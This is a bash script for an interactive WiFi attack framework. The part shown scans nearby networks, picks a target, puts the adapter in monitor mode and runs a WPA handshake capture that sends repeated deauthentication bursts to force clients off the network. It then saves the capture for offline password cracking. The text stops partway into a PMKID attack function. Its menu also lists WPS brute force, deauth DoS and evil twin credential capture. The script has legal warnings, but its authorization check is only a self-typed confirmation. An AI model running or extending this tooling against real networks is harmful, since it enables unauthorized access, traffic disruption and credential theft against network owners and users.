#!/bin/bash

################################################################################
# Advanced WiFi Security Testing Framework
# Part of RoboWiFi-AP Security Assessment Framework
# 
# ⚠️  LEGAL WARNING: USE ONLY ON NETWORKS YOU OWN OR HAVE WRITTEN PERMISSION
# ⚠️  Unauthorized wireless network attacks are ILLEGAL
################################################################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration
INTERFACE=""
MONITOR_INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
OUTPUT_DIR="$HOME/wifi_security_tests"
SESSION_DIR=""
ATTACK_MODE=""
WORDLIST=""
WORDLIST_DIR="$HOME/wordlists"
AUTH_REF=""

# Attack modes available
declare -A ATTACK_MODES=(
    ["1"]="handshake_capture"
    ["2"]="pmkid_attack"
    ["3"]="wps_attack"
    ["4"]="deauth_attack"
)

# Wordlist collection
declare -a WORDLISTS=()

# PIDs for cleanup
AIRODUMP_PID=""
REAVER_PID=""
CRACKING_PID=""

# Stats
HANDSHAKE_CAPTURED=false
PMKID_CAPTURED=false
WPS_SUCCESS=false
PASSWORDS_TESTED=0
START_TIME=""

################################################################################
# UTILITY FUNCTIONS
################################################################################

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    
    # Kill all background processes
    [ ! -z "$AIRODUMP_PID" ] && kill $AIRODUMP_PID 2>/dev/null
    [ ! -z "$REAVER_PID" ] && kill $REAVER_PID 2>/dev/null
    [ ! -z "$CRACKING_PID" ] && kill $CRACKING_PID 2>/dev/null
    
    # Kill any remaining aircrack processes
    pkill -9 airodump-ng 2>/dev/null
    pkill -9 aireplay-ng 2>/dev/null
    pkill -9 reaver 2>/dev/null
    pkill -9 aircrack-ng 2>/dev/null
    pkill -9 hashcat 2>/dev/null
    
    # Disable monitor mode
    if [ ! -z "$MONITOR_INTERFACE" ]; then
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # Restart networking
    systemctl restart NetworkManager 2>/dev/null
    
    # Show session summary
    show_session_summary
    
    echo -e "${GREEN}[+] Cleanup complete${NC}"
    exit 0
}

trap cleanup SIGINT SIGTERM

check_root() {
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║     Advanced WiFi Security Testing Framework v2.0               ║
║              Multi-Attack & Cracking System                      ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️${NC}"
    echo -e "${YELLOW}    Use only on networks you own or have written permission${NC}\n"
}

show_legal_warning() {
    echo -e "${RED}${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}${BOLD}                    LEGAL WARNING                          ${NC}"
    echo -e "${RED}${BOLD}═══════════════════════════════════════════════════════════${NC}\n"

    echo -e "${NC}This tool performs aggressive security testing including:"
    echo "  • Network monitoring and packet capture"
    echo "  • Deauthentication attacks"
    echo "  • WPS brute force attacks"
    echo "  • Password dictionary attacks"
    echo ""
    echo -e "${RED}Unauthorized use violates:${NC}"
    echo "  • Computer Fraud and Abuse Act (CFAA)"
    echo "  • Electronic Communications Privacy Act (ECPA)"
    echo "  • Wiretap Act"
    echo "  • Local and international cybercrime laws"
    echo ""
    echo -e "${YELLOW}Criminal penalties may include:${NC}"
    echo '  • Heavy fines (up to $250,000)'
    echo "  • Prison time (up to 20 years)"
    echo "  • Civil liability"
    echo ""
    echo -e "${GREEN}You MUST have:${NC}"
    echo "  ✓ Written authorization from network owner"
    echo "  ✓ Documented scope of testing"
    echo "  ✓ Legal counsel review (for professional testing)"
    echo ""
    echo -e "${RED}${BOLD}═══════════════════════════════════════════════════════════${NC}\n"

    # Authorization confirmation
    echo -e "${YELLOW}Do you have WRITTEN AUTHORIZATION to test this network?${NC}"
    echo -e "${CYAN}  [y] Yes — I have written authorization${NC}"
    echo -e "${CYAN}  [n] No  — Exit${NC}\n"
    read -p "Confirm [y/n]: " confirm

    case "${confirm,,}" in
        y|yes)
            echo -e "${GREEN}[+] Authorization confirmed${NC}\n"
            ;;
        *)
            echo -e "${RED}[!] Authorization not confirmed. Exiting.${NC}"
            exit 1
            ;;
    esac

    # Reference number
    echo -e "${YELLOW}Enter authorization reference/ticket number:${NC}"
    read -p "Reference: " auth_ref

    if [ -z "$auth_ref" ]; then
        echo -e "${RED}[!] No reference provided. Exiting.${NC}"
        exit 1
    fi

    # Store temporarily until SESSION_DIR is created
    AUTH_REF="$auth_ref"
    echo -e "${GREEN}[+] Authorization logged: $auth_ref${NC}\n"
}

check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}\n"

    local required_tools=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng")
    local optional_tools=("reaver" "wash" "hashcat" "hcxdumptool" "tshark")
    local missing_required=()

    # Required tools
    echo -e "${CYAN}  Required:${NC}"
    for tool in "${required_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            echo -e "${GREEN}    ✓ $tool${NC}"
        else
            echo -e "${RED}    ✗ $tool${NC}"
            missing_required+=("$tool")
        fi
    done

    # Optional tools — show what each enables
    echo -e "\n${CYAN}  Optional:${NC}"
    declare -A TOOL_PURPOSE=(
        ["reaver"]="WPS PIN attack"
        ["wash"]="WPS detection"
        ["hashcat"]="GPU accelerated cracking"
        ["hcxdumptool"]="PMKID attack"
        ["tshark"]="Faster handshake detection"
    )

    for tool in "${optional_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            echo -e "${GREEN}    ✓ $tool${NC} ${CYAN}(${TOOL_PURPOSE[$tool]})${NC}"
        else
            echo -e "${YELLOW}    - $tool${NC} ${CYAN}(${TOOL_PURPOSE[$tool]} — disabled)${NC}"
        fi
    done

    # Also check hcxpcapngtool/hcxpcaptool — different names on different versions
    echo -e "\n${CYAN}  PMKID conversion:${NC}"
    if command -v hcxpcapngtool &>/dev/null; then
        echo -e "${GREEN}    ✓ hcxpcapngtool${NC}"
    elif command -v hcxpcaptool &>/dev/null; then
        echo -e "${GREEN}    ✓ hcxpcaptool (legacy)${NC}"
    else
        echo -e "${YELLOW}    - hcxpcapngtool/hcxpcaptool${NC} ${CYAN}(PMKID conversion — disabled)${NC}"
    fi

    echo ""

    if [ ${#missing_required[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing required tools: ${missing_required[*]}${NC}"
        echo -e "${YELLOW}[*] Install with:${NC}"
        echo -e "    ${CYAN}sudo apt-get install aircrack-ng wireless-tools iw${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Core dependencies satisfied${NC}\n"
}

create_session_dir() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    SESSION_DIR="$OUTPUT_DIR/session_${timestamp}"
    mkdir -p "$SESSION_DIR"/{captures,wordlists,results,logs}
    START_TIME=$(date +%s)
    echo -e "${GREEN}[+] Session directory: $SESSION_DIR${NC}\n"
    log_action "Session started — Authorization ref: ${AUTH_REF:-none}"
}

log_action() {
    local message="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$SESSION_DIR/logs/actions.log"
}

################################################################################
# INTERFACE MANAGEMENT
################################################################################

list_interfaces() {
    echo -e "${BLUE}[*] Available wireless interfaces:${NC}\n"

    # Store interfaces in an array for reuse
    WIRELESS_INTERFACES=()

    while read -r iface; do
        [[ -z "$iface" ]] && continue
        WIRELESS_INTERFACES+=("$iface")

        local count=${#WIRELESS_INTERFACES[@]}
        local mac=$(cat /sys/class/net/$iface/address 2>/dev/null)
        local driver=$(basename "$(readlink -f /sys/class/net/$iface/device/driver)" 2>/dev/null)
        local phy=$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')

        echo -e "${GREEN}  [$count] $iface${NC}"
        echo -e "      MAC:    ${CYAN}$mac${NC}"
        [ -n "$driver" ] && echo -e "      Driver: ${CYAN}$driver${NC}"

        iw phy "$phy" info 2>/dev/null | grep -q "monitor" \
            && echo -e "      Monitor: ${GREEN}✓ Supported${NC}" \
            || echo -e "      Monitor: ${RED}✗ Not Supported${NC}"

        echo ""
    done < <(iw dev | awk '/Interface/{print $2}')

    if [ ${#WIRELESS_INTERFACES[@]} -eq 0 ]; then
        echo -e "${RED}[!] No wireless interfaces found${NC}"
        echo -e "${YELLOW}[*] Tip: Make sure your adapter is plugged in and driver is loaded${NC}"
        echo -e "${YELLOW}[*] Check with: lsusb / lspci / dmesg | grep -i wlan${NC}"
        exit 1
    fi
}

select_interface() {
    list_interfaces  # populates WIRELESS_INTERFACES array

    read -p "Select interface [1-${#WIRELESS_INTERFACES[@]}]: " selection

    if [[ "$selection" =~ ^[0-9]+$ ]] && \
       [ "$selection" -ge 1 ] && \
       [ "$selection" -le "${#WIRELESS_INTERFACES[@]}" ]; then
        INTERFACE="${WIRELESS_INTERFACES[$((selection - 1))]}"
    else
        # Allow typing interface name directly
        INTERFACE="$selection"
        if ! iw dev "$INTERFACE" info &>/dev/null; then
            echo -e "${RED}[!] Invalid interface: $INTERFACE${NC}"
            exit 1
        fi
    fi

    echo -e "${GREEN}[+] Selected: $INTERFACE${NC}\n"
    log_action "Selected interface: $INTERFACE"
}

enable_monitor_mode() {
    echo -e "${BLUE}[*] Enabling monitor mode...${NC}"
    
    # Kill interfering processes
    echo -e "${BLUE}[*] Stopping interfering processes...${NC}"
    airmon-ng check kill >/dev/null 2>&1
    
    # Enable monitor mode
    airmon-ng start "$INTERFACE" >/dev/null 2>&1
    
    # Determine monitor interface name
    if iwconfig "${INTERFACE}mon" 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_INTERFACE="${INTERFACE}mon"
    elif iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_INTERFACE="$INTERFACE"
    else
        echo -e "${RED}[!] Failed to enable monitor mode${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Monitor mode enabled: $MONITOR_INTERFACE${NC}\n"
    log_action "Monitor mode enabled: $MONITOR_INTERFACE"
    sleep 2
}

################################################################################
# NETWORK SCANNING
################################################################################

scan_networks() {
    echo -e "${BLUE}[*] Scanning for networks... (Ctrl+C to stop)${NC}\n"

    local scan_file="$SESSION_DIR/captures/scan"

    trap '' SIGINT
    airodump-ng "$MONITOR_INTERFACE" \
        -w "$scan_file" \
        --output-format csv \
        >/dev/null 2>&1 &
    SCAN_PID=$!
    trap "kill $SCAN_PID 2>/dev/null" SIGINT
    trap cleanup SIGTERM

    local elapsed=0
    local max=45

    # Save cursor position once at start
    tput smcup  # switch to alternate screen buffer - no blinking

    while kill -0 $SCAN_PID 2>/dev/null && [ $elapsed -lt $max ]; do
        sleep 2
        elapsed=$((elapsed + 2))

        # Move cursor to top-left instead of clearing
        tput cup 0 0

        echo -e "${BLUE}[*] Scanning... ${elapsed}s / ${max}s  (Ctrl+C to stop early)${NC}        "
        echo ""
        printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
            "No." "BSSID" "Ch" "Enc" "Pwr" "Clients" "ESSID"
        printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
            "---" "-----------------" "---" "-------" "----" "-------" "-----"

        [ ! -f "${scan_file}-01.csv" ] && { echo -e "${YELLOW}  Waiting for data...${NC}"; continue; }

        NETWORK_BSSIDS=()
        NETWORK_CHANNELS=()
        NETWORK_ESSIDS=()
        NETWORK_ENCS=()
        NETWORK_PWRS=()
	NETWORK_CLIENTS=()
        local count=0
        local in_ap_section=true

        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            [[ -z "${bssid// }" ]]   && { in_ap_section=false; continue; }
            $in_ap_section           || continue
            [[ "$bssid" =~ ^BSSID ]] && continue
            [[ "$bssid" =~ ^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2} ]] || continue

            bssid="${bssid// /}"
            channel="${channel// /}"
            privacy="${privacy// /}"
            power="${power// /}"
            essid="${essid#"${essid%%[![:space:]]*}"}"
            essid="${essid%"${essid##*[![:space:]]}"}"

            local enc_type="OPEN"
            [[ "$privacy" =~ WPA3 ]] && enc_type="WPA3"
            [[ "$privacy" =~ WPA2 ]] && enc_type="WPA2"
            [[ "$privacy" =~ WPA && ! "$privacy" =~ WPA2 ]] && enc_type="WPA"
            [[ "$privacy" =~ WEP  ]] && enc_type="WEP"

            # Fix: count clients properly from stations section
            # Stations section has BSSID in column 6, not column 1
            local clients
            clients=$(awk -F',' -v bss="$bssid" '
                /^Station MAC/ { in_sta=1; next }
                in_sta && NF>5 {
                    gsub(/ /,"",$6)
                    if ($6 == bss) count++
                }
                END { print count+0 }
            ' "${scan_file}-01.csv")

            local color=$GREEN
            [ "$enc_type" = "WPA"  ] && color=$YELLOW
            [ "$enc_type" = "WPA2" ] && color=$YELLOW
            [ "$enc_type" = "WPA3" ] && color=$RED
            [ "$enc_type" = "OPEN" ] && color=$CYAN

            count=$((count + 1))
            # Print full line with padding to overwrite previous longer lines
            printf "${color}%-4s${NC} %-18s %-4s %-8s %-5s %-8s %-30s\n" \
                "$count" "$bssid" "$channel" "$enc_type" "$power" "$clients" "$essid"

            NETWORK_BSSIDS+=("$bssid")
	    NETWORK_CHANNELS+=("$channel")
	    NETWORK_ESSIDS+=("$essid")
	    NETWORK_ENCS+=("$enc_type")
	    NETWORK_PWRS+=("$power")
	    NETWORK_CLIENTS+=("$clients")

        done < "${scan_file}-01.csv"

        # Clear any leftover lines from previous longer scans
        tput ed

        [ $count -eq 0 ] && echo -e "${YELLOW}  Waiting for networks...${NC}"

    done

    kill $SCAN_PID 2>/dev/null
    wait $SCAN_PID 2>/dev/null

    # Restore normal screen
    tput rmcup

    trap cleanup SIGINT SIGTERM

    if [ ${#NETWORK_BSSIDS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No networks found${NC}"
        return 1
    fi

    # Print final clean table once
    echo -e "${BLUE}[*] Scan complete: ${#NETWORK_BSSIDS[@]} networks found${NC}\n"
    printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
        "No." "BSSID" "Ch" "Enc" "Pwr" "Clients" "ESSID"
    printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
        "---" "-----------------" "---" "-------" "----" "-------" "-----"
    for i in "${!NETWORK_BSSIDS[@]}"; do
        local enc="${NETWORK_ENCS[$i]}"
        local color=$GREEN
        [ "$enc" = "WPA"  ] && color=$YELLOW
        [ "$enc" = "WPA2" ] && color=$YELLOW
        [ "$enc" = "WPA3" ] && color=$RED
        [ "$enc" = "OPEN" ] && color=$CYAN
        printf "${color}%-4s${NC} %-18s %-4s %-8s %-30s\n" \
            "$((i+1))" "${NETWORK_BSSIDS[$i]}" "${NETWORK_CHANNELS[$i]}" "$enc" "${NETWORK_ESSIDS[$i]}"
    done

    log_action "Scan completed: ${#NETWORK_BSSIDS[@]} networks found"
    return 0
}

select_target() {
    while true; do
        echo -e "\n${BLUE}[*] Target Selection${NC}"
        echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
        echo -e "  ${GREEN}[1-${#NETWORK_BSSIDS[@]}]${NC} Select by number"
        echo -e "  ${GREEN}[s]${NC}   Search by ESSID name"
        echo -e "  ${GREEN}[f]${NC}   Filter: show only networks with clients"
        echo -e "  ${GREEN}[r]${NC}   Re-scan networks"
        echo -e "  ${GREEN}[q]${NC}   Quit"
        echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
        read -p "Choice: " input

        case "$input" in

            # ── Quit ──────────────────────────────────────────────
            q|Q)
                echo -e "${YELLOW}[*] Exiting...${NC}"
                cleanup
                ;;

            # ── Re-scan ───────────────────────────────────────────
            r|R)
                echo -e "${YELLOW}[*] Re-scanning...${NC}"
                if ! scan_networks; then
                    echo -e "${RED}[!] Scan failed${NC}"
                fi
                continue
                ;;

            # ── Filter: only networks with clients ────────────────
            f|F)
                echo -e "\n${BLUE}[*] Networks with active clients:${NC}\n"
                printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
                    "No." "BSSID" "Ch" "Enc" "Pwr" "Clients" "ESSID"
                printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
                    "---" "-----------------" "---" "-------" "----" "-------" "-----"

                local found=0
                for i in "${!NETWORK_BSSIDS[@]}"; do
                    [ "${NETWORK_CLIENTS[$i]:-0}" -gt 0 ] || continue
                    found=$((found + 1))
                    local enc="${NETWORK_ENCS[$i]}"
                    local color=$YELLOW
                    [ "$enc" = "WPA3" ] && color=$RED
                    [ "$enc" = "OPEN" ] && color=$CYAN
                    printf "${color}%-4s${NC} %-18s %-4s %-8s %-5s %-8s %s\n" \
                        "$((i+1))" "${NETWORK_BSSIDS[$i]}" "${NETWORK_CHANNELS[$i]}" \
                        "$enc" "${NETWORK_PWRS[$i]:-?}" "${NETWORK_CLIENTS[$i]}" \
                        "${NETWORK_ESSIDS[$i]}"
                done

                [ $found -eq 0 ] && echo -e "${YELLOW}  No networks with active clients found${NC}"
                continue
                ;;

            # ── Search by ESSID ───────────────────────────────────
            s|S)
                read -p "Search ESSID (partial ok): " search_term
                echo -e "\n${BLUE}[*] Results for '${search_term}':${NC}\n"
                printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
                    "No." "BSSID" "Ch" "Enc" "Pwr" "Clients" "ESSID"
                printf "${CYAN}%-4s %-18s %-4s %-8s %-5s %-8s %s${NC}\n" \
                    "---" "-----------------" "---" "-------" "----" "-------" "-----"

                local found=0
                for i in "${!NETWORK_BSSIDS[@]}"; do
                    # Case-insensitive match on ESSID or BSSID
                    local essid_lower="${NETWORK_ESSIDS[$i],,}"
                    local term_lower="${search_term,,}"
                    [[ "$essid_lower" == *"$term_lower"* || \
                       "${NETWORK_BSSIDS[$i],,}" == *"$term_lower"* ]] || continue
                    found=$((found + 1))
                    local enc="${NETWORK_ENCS[$i]}"
                    local color=$YELLOW
                    [ "$enc" = "WPA3" ] && color=$RED
                    [ "$enc" = "OPEN" ] && color=$CYAN
                    printf "${color}%-4s${NC} %-18s %-4s %-8s %-5s %-8s %s\n" \
                        "$((i+1))" "${NETWORK_BSSIDS[$i]}" "${NETWORK_CHANNELS[$i]}" \
                        "$enc" "${NETWORK_PWRS[$i]:-?}" "${NETWORK_CLIENTS[$i]:-0}" \
                        "${NETWORK_ESSIDS[$i]}"
                done

                [ $found -eq 0 ] && echo -e "${YELLOW}  No matches found${NC}"
                continue
                ;;

            # ── Select by number ──────────────────────────────────
            *)
                if ! [[ "$input" =~ ^[0-9]+$ ]] || \
                   [ "$input" -lt 1 ] || \
                   [ "$input" -gt "${#NETWORK_BSSIDS[@]}" ]; then
                    echo -e "${RED}[!] Invalid input. Enter a number between 1 and ${#NETWORK_BSSIDS[@]}${NC}"
                    continue
                fi

                local idx=$((input - 1))
                TARGET_BSSID="${NETWORK_BSSIDS[$idx]}"
                TARGET_CHANNEL="${NETWORK_CHANNELS[$idx]}"
                TARGET_ESSID="${NETWORK_ESSIDS[$idx]}"
                TARGET_ENC="${NETWORK_ENCS[$idx]}"
                local clients="${NETWORK_CLIENTS[$idx]:-0}"
                local pwr="${NETWORK_PWRS[$idx]:-?}"

                # Confirm screen
                echo -e "\n${GREEN}[+] Target selected:${NC}"
                echo -e "    ESSID:      ${CYAN}$TARGET_ESSID${NC}"
                echo -e "    BSSID:      ${CYAN}$TARGET_BSSID${NC}"
                echo -e "    Channel:    ${CYAN}$TARGET_CHANNEL${NC}"
                echo -e "    Encryption: ${CYAN}$TARGET_ENC${NC}"
                echo -e "    Signal:     ${CYAN}${pwr} dBm${NC}"
                echo -e "    Clients:    ${CYAN}$clients${NC}"

                # Helpful hints based on what we know
                echo ""
                if [ "$clients" -gt 0 ]; then
                    echo -e "  ${GREEN}✓ Active clients detected — handshake capture recommended${NC}"
                else
                    echo -e "  ${YELLOW}⚠ No active clients — PMKID attack recommended${NC}"
                fi
                if [ "$TARGET_ENC" = "WPA3" ]; then
                    echo -e "  ${RED}⚠ WPA3 detected — most attacks will not work${NC}"
                fi
                if [ "$TARGET_ENC" = "OPEN" ]; then
                    echo -e "  ${CYAN}ℹ Open network — no cracking needed${NC}"
                fi

                echo ""
                read -p "Confirm target? [Y/n]: " confirm
                [[ "$confirm" =~ ^[Nn]$ ]] && continue

                log_action "Target: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL ENC:$TARGET_ENC Clients:$clients"
                return 0
                ;;
        esac
    done
}

################################################################################
# ATTACK METHODS
################################################################################

show_attack_menu() {
    echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║              SELECT ATTACK METHOD                      ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${GREEN}[1]${NC} WPA/WPA2 Handshake Capture"
    echo -e "    ${CYAN}→ Capture 4-way handshake, then crack offline${NC}"
    echo -e "    ${CYAN}→ Best for: Most WPA2 networks${NC}\n"
    
    echo -e "${GREEN}[2]${NC} PMKID Attack (Hashcat)"
    echo -e "    ${CYAN}→ Capture PMKID without clients or handshake${NC}"
    echo -e "    ${CYAN}→ Best for: Networks with no active clients${NC}\n"
    
    echo -e "${GREEN}[3]${NC} WPS PIN Attack"
    echo -e "    ${CYAN}→ Brute force WPS PIN (if enabled)${NC}"
    echo -e "    ${CYAN}→ Best for: Routers with WPS enabled${NC}\n"
    
    echo -e "${GREEN}[4]${NC} Deauthentication Attack"
    echo -e "    ${CYAN}→ Disconnect clients from network${NC}"
    echo -e "    ${CYAN}→ Best for: Testing DoS protection${NC}\n"
    
    echo -e "${GREEN}[5]${NC} Evil Twin Attack"
    echo -e "    ${CYAN}→ Create fake AP to capture credentials${NC}"
    echo -e "    ${CYAN}→ Best for: Testing user awareness${NC}\n"
    
    echo -e "${GREEN}[6]${NC} Automated Multi-Attack"
    echo -e "    ${CYAN}→ Try multiple methods automatically${NC}"
    echo -e "    ${CYAN}→ Best for: Comprehensive testing${NC}\n"
    
    echo -e "${GREEN}[0]${NC} Back to main menu\n"
    
    read -p "Select attack [1-6]: " attack_choice

    if [ "$attack_choice" = "0" ]; then
        echo -e "${YELLOW}[*] Returning to target selection...${NC}"
        select_target
        show_attack_menu
        return
    fi

    ATTACK_MODE="${ATTACK_MODES[$attack_choice]}"

    if [ -z "$ATTACK_MODE" ]; then
        echo -e "${RED}[!] Invalid selection, try again${NC}"
        sleep 1
        show_attack_menu
        return
    fi
}
attack_handshake_capture() {
    echo -e "${BLUE}[*] Starting handshake capture attack...${NC}\n"

    local capture_file="$SESSION_DIR/captures/handshake"
    local timeout_secs=120
    local elapsed=0

    # Warn if no clients — handshake needs a client to (re)connect
    if [ "${NETWORK_CLIENTS[$(( $(printf '%s\n' "${NETWORK_BSSIDS[@]}" | \
        grep -n "^${TARGET_BSSID}$" | cut -d: -f1) - 1 ))]:-0}" -eq 0 ]; then
        echo -e "${YELLOW}⚠ No active clients detected on this network${NC}"
        echo -e "${YELLOW}  Handshake requires a client to connect/reconnect${NC}"
        echo -e "${YELLOW}  Consider PMKID attack instead (option 2)${NC}\n"
        read -p "Continue anyway? [y/N]: " anyway
        [[ ! "$anyway" =~ ^[Yy]$ ]] && return 1
    fi

    echo -e "${YELLOW}[*] Starting targeted capture on CH${TARGET_CHANNEL} / ${TARGET_BSSID}...${NC}\n"

    # Start airodump-ng focused on target only
    airodump-ng -c "$TARGET_CHANNEL" \
        --bssid "$TARGET_BSSID" \
        -w "$capture_file" \
        --output-format pcap \
        "$MONITOR_INTERFACE" > "$SESSION_DIR/logs/airodump_handshake.log" 2>&1 &
    AIRODUMP_PID=$!

    sleep 3

    # Ask about deauth
    echo -e "${YELLOW}[?] Send deauth packets to force client reconnect?${NC}"
    read -p "Recommended if clients are connected [Y/n]: " deauth_choice

    if [[ ! "$deauth_choice" =~ ^[Nn]$ ]]; then
        echo -e "${GREEN}[+] Sending deauth bursts while monitoring for handshake...${NC}\n"
        local deauth_round=0

        while [ $elapsed -lt $timeout_secs ]; do
            deauth_round=$((deauth_round + 1))
            echo -e "${CYAN}[*] Deauth burst $deauth_round — elapsed: ${elapsed}s / ${timeout_secs}s${NC}"

            # Send burst in background so we can keep checking
            aireplay-ng --deauth 5 -a "$TARGET_BSSID" \
                "$MONITOR_INTERFACE" >/dev/null 2>&1 &

            # Check every 2 seconds for up to 15 seconds between bursts
            local wait=0
            while [ $wait -lt 15 ]; do
                sleep 2
                wait=$((wait + 2))
                elapsed=$((elapsed + 2))

                printf "\r${CYAN}  Monitoring... ${elapsed}s / ${timeout_secs}s${NC}   "

                # Check for handshake using tshark if available (most reliable)
                if command -v tshark &>/dev/null; then
                    local hs
                    hs=$(tshark -r "${capture_file}-01.cap" \
                        -Y "eapol" 2>/dev/null | wc -l)
                    if [ "$hs" -ge 2 ]; then
                        echo -e "\n${GREEN}[+] EAPOL frames captured (handshake likely complete)${NC}"
                        _confirm_and_finish_handshake "$capture_file"
                        return $?
                    fi

                # Fallback: use aircrack-ng
                elif ls "${capture_file}"-*.cap &>/dev/null; then
                    if aircrack-ng "${capture_file}"-*.cap \
                        -b "$TARGET_BSSID" 2>/dev/null | grep -q "handshake"; then
                        echo ""
                        _confirm_and_finish_handshake "$capture_file"
                        return $?
                    fi
                fi

                [ $elapsed -ge $timeout_secs ] && break
            done
        done

    else
        # Passive monitoring — no deauth, just wait
        echo -e "${CYAN}[*] Passive monitoring (waiting for natural reconnect)...${NC}"
        echo -e "${CYAN}[*] Timeout: ${timeout_secs}s${NC}\n"

        while [ $elapsed -lt $timeout_secs ]; do
            sleep 2
            elapsed=$((elapsed + 2))
            printf "\r${CYAN}  Monitoring... ${elapsed}s / ${timeout_secs}s${NC}   "

            if command -v tshark &>/dev/null; then
                local hs
                hs=$(tshark -r "${capture_file}-01.cap" \
                    -Y "eapol" 2>/dev/null | wc -l)
                if [ "$hs" -ge 2 ]; then
                    echo -e "\n${GREEN}[+] Handshake detected!${NC}"
                    _confirm_and_finish_handshake "$capture_file"
                    return $?
                fi
            elif ls "${capture_file}"-*.cap &>/dev/null; then
                if aircrack-ng "${capture_file}"-*.cap \
                    -b "$TARGET_BSSID" 2>/dev/null | grep -q "handshake"; then
                    echo ""
                    _confirm_and_finish_handshake "$capture_file"
                    return $?
                fi
            fi
        done
    fi

    echo -e "\n${RED}[!] Timeout reached — no handshake captured${NC}"
    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null

    echo -e "${YELLOW}[?] What would you like to do?${NC}"
    echo -e "  ${GREEN}[1]${NC} Try again (another $timeout_secs seconds)"
    echo -e "  ${GREEN}[2]${NC} Try PMKID attack instead"
    echo -e "  ${GREEN}[3]${NC} Return to attack menu"
    read -p "Choice: " retry_choice

    case $retry_choice in
        1) attack_handshake_capture ;;
        2) attack_pmkid ;;
        3) show_attack_menu ;;
        *) return 1 ;;
    esac
}

# Helper — validates and saves handshake
_confirm_and_finish_handshake() {
    local capture_file="$1"

    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null

    echo -e "${YELLOW}[*] Verifying handshake integrity...${NC}"

    # Final aircrack-ng validation
    if aircrack-ng "${capture_file}"-*.cap \
        -b "$TARGET_BSSID" 2>/dev/null | grep -q "handshake"; then
        echo -e "${GREEN}[+] HANDSHAKE VERIFIED AND SAVED${NC}"
        echo -e "    File: ${CYAN}${capture_file}-01.cap${NC}\n"
        HANDSHAKE_CAPTURED=true
        log_action "Handshake captured and verified: ${capture_file}-01.cap"
        return 0
    else
        echo -e "${YELLOW}[!] Capture may be incomplete — EAPOL frames found but full handshake unconfirmed${NC}"
        echo -e "${YELLOW}    File saved anyway: ${capture_file}-01.cap${NC}"
        echo -e "${YELLOW}    You can try cracking it — partial handshakes sometimes work${NC}\n"
        HANDSHAKE_CAPTURED=true
        log_action "Partial handshake saved: ${capture_file}-01.cap"
        return 0
    fi
}

attack_pmkid() {
    echo -e "${BLUE}[*] Starting PMKID attack...${NC}\n"

    # Dependency check with fallback offer
    if ! command -v hcxdumptool &>/dev/null || ! command -v hcxpcapngtool &>/dev/null; then
        echo -e "${RED}[!] Missing required tools for PMKID attack:${NC}"
        command -v hcxdumptool   &>/dev/null || echo -e "    ${RED}✗ hcxdumptool${NC}"
        command -v hcxpcapngtool &>/dev/null || echo -e "    ${RED}✗ hcxpcapngtool${NC}"
        echo -e "\n${YELLOW}[*] Install with: sudo apt-get install hcxdumptool hcxtools${NC}\n"

        echo -e "${YELLOW}[?] What would you like to do?${NC}"
        echo -e "  ${GREEN}[1]${NC} Try handshake capture instead"
        echo -e "  ${GREEN}[2]${NC} Return to attack menu"
        read -p "Choice: " fallback
        case $fallback in
            1) attack_handshake_capture ;;
            *) show_attack_menu ;;
        esac
        return 1
    fi

    local pmkid_file="$SESSION_DIR/captures/pmkid"
    local filter_file="$SESSION_DIR/captures/pmkid_filter.txt"
    local timeout_secs=60
    local elapsed=0

    echo -e "${CYAN}  Target: $TARGET_ESSID${NC}"
    echo -e "${CYAN}  BSSID:  $TARGET_BSSID${NC}"
    echo -e "${CYAN}  Note:   No clients needed for this attack${NC}\n"

    # hcxdumptool newer versions need MAC in a file, not inline
    # Format: remove colons, lowercase
